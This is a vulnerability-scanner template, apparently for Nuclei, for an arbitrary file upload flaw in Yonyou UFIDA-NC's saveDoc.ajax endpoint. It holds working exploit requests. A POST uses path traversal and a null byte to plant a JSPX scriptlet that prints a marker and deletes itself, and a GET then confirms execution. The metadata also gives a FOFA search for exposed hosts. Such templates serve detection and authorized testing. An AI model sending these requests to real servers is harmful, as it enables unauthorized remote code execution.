http:
- matchers:
  - condition: and
    dsl:
    - status_code_2 == 200
    - contains(body_2, "{{r1}}")
    type: dsl
  raw:
  - "POST /uapws/saveDoc.ajax?ws=/../../{{filename}}%00 HTTP/1.1\nHost: {{Hostname}}\n\
    Accept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent:\
    \ Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\
    \ Chrome/89.0.4389.90 Safari/537.36\nConnection: close\nContent-Type: application/x-www-form-urlencoded\n\
    \ncontent=<hi xmlns:hi=\"http://java.sun.com/JSP/Page\">\n            <hi:directive.page\
    \ import=\"java.util.*,java.io.*,java.net.*\"/>\n        <hi:scriptlet>\n    \
    \              out.println(\"{{r1}}\");new java.io.File(application.getRealPath(request.getServletPath())).delete();\
    \ \n        </hi:scriptlet>\n      </hi>\n"
  - 'GET /uapws/{{filename}} HTTP/1.1

    Host: {{Hostname}}

    '
id: yonyou-ufida-nc-savedoc-file-upload
info:
  author: Co5mos
  description: UFIDA-NC saveDoc.ajax interface allows an attacker to upload arbitrary
    files, potentially leading to remote code execution.
  metadata:
    fofa-query: "app=\"\u7528\u53CB-UFIDA-NC\" && title=\"\u4EA7\u54C1\u767B\u5F55\
      \u754C\u9762\""
  name: Yonyou UFIDA-NC saveDoc.ajax - Arbitrary File Upload
  reference:
  - https://mp.weixin.qq.com/s/HSD1IVI7TlixrGyYSlvXjA
  severity: high
  tags: fileupload,rce,ufida,yonyou
variables:
  filename: '{{rand_base(5)}}.jspx'
  r1: '{{randstr}}'
